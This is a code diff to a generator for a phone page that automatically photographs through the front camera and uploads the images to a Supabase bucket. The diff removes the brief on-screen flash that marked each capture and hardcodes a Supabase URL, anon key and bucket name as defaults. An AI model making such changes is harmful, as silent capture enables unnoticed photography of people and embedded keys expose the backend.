@@ -93,9 +93,6 @@ export function generateStandaloneHtmlCode(): string {
             <h3 class="text-sm font-semibold text-slate-200">Camera Inactive</h3>
             <p class="text-xs text-slate-400 mt-1">Click the <span class="text-emerald-400 font-medium">"View"</span> button below to initialize the front camera stream, activate Screen Wake Lock, and start automated monitoring.</p>
           </div>
-
-          <!-- Silent Flash Visual Notification Overlay -->
-          <div id="flashOverlay" class="absolute inset-0 bg-white/25 pointer-events-none opacity-0 transition-opacity duration-150"></div>
         </div>
 
         <!-- Primary Action Button with EXACT label "View" -->
@@ -240,7 +237,6 @@ export function generateStandaloneHtmlCode(): string {
     const recIndicator = document.getElementById('recIndicator');
     const cameraStatusText = document.getElementById('cameraStatusText');
     const resBadge = document.getElementById('resBadge');
-    const flashOverlay = document.getElementById('flashOverlay');
     const testModeCheckbox = document.getElementById('testModeCheckbox');
     const countdownDisplay = document.getElementById('countdownDisplay');
     const cycleStatus = document.getElementById('cycleStatus');
@@ -257,11 +253,18 @@ export function generateStandaloneHtmlCode(): string {
     const supabaseAnonKeyInput = document.getElementById('supabaseAnonKeyInput');
     const supabaseBucketInput = document.getElementById('supabaseBucketInput');
 
-    // Load LocalStorage
-    deviceIdInput.value = localStorage.getItem('sec_device_id') || 'Phone_01';
-    supabaseUrlInput.value = localStorage.getItem('sec_supabase_url') || '';
-    supabaseAnonKeyInput.value = localStorage.getItem('sec_supabase_anon_key') || '';
-    supabaseBucketInput.value = localStorage.getItem('sec_supabase_bucket') || 'security-photos';
+    // Load LocalStorage or use exact pre-configured defaults
+    const HARDCODED_CONFIG = {
+      SUPABASE_URL: "https://nchosqdrzsphqnmrosfr.supabase.co",
+      SUPABASE_ANON_KEY: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5jaG9zcWRyenNwaHFubXJvc2ZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk1MzU1NTEsImV4cCI6MjEwNTExMTU1MX0.BnLxYZyLXxYLzF9PN7KBoLvoDvp-WLI5Qh2--XH9oeE",
+      BUCKET_NAME: "healthy",
+      DEFAULT_DEVICE_ID: "Phone_01"
+    };
+
+    deviceIdInput.value = localStorage.getItem('sec_device_id') || HARDCODED_CONFIG.DEFAULT_DEVICE_ID;
+    supabaseUrlInput.value = localStorage.getItem('sec_supabase_url') || HARDCODED_CONFIG.SUPABASE_URL;
+    supabaseAnonKeyInput.value = localStorage.getItem('sec_supabase_anon_key') || HARDCODED_CONFIG.SUPABASE_ANON_KEY;
+    supabaseBucketInput.value = localStorage.getItem('sec_supabase_bucket') || HARDCODED_CONFIG.BUCKET_NAME;
     testModeCheckbox.checked = localStorage.getItem('sec_test_mode') === 'true';
 
     // Save on change
@@ -358,10 +361,6 @@ export function generateStandaloneHtmlCode(): string {
       canvas.height = height;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(cameraVideo, 0, 0, width, height);
-
-      // Silent visual subtle flash
-      flashOverlay.style.opacity = '1';
-      setTimeout(() => { flashOverlay.style.opacity = '0'; }, 100);
 
       const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.90));
       const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
